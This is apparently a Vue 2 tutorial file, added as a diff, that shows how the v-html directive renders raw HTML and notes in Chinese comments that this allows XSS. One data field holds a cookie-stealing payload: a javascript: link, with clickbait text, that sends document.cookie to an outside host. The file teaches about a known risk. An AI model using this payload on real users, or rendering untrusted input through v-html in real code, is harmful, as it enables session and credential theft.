@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <script src="../js/vue@2.6.14.js"></script>
+</head>
+<body>
+  <div id="root">
+    <!-- 插值语法，反而不行 -->
+    <div>{{str}}</div>
+    <!-- 渲染语法innerHTML,允许二次渲染 -->
+    <div v-html="str">老内容被替换</div>
+    <!-- 直接渲染html，会嵌入恶意代码 -->
+    <div v-html="str2">xss攻击</div>
+  </div>
+</body>
+<script>
+  Vue.config.productionTip = false
+  const vm = new Vue({
+    el:'#root',
+    data() {
+      return {
+        name:'测试',
+        str:'<h3>这个就是inner HTML</h3>',
+        str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟快点我</a>',
+      }
+    },
+  })
+  // 导出所有的cookie
+  // console.log(document.cookie);
+</script>
+</html>
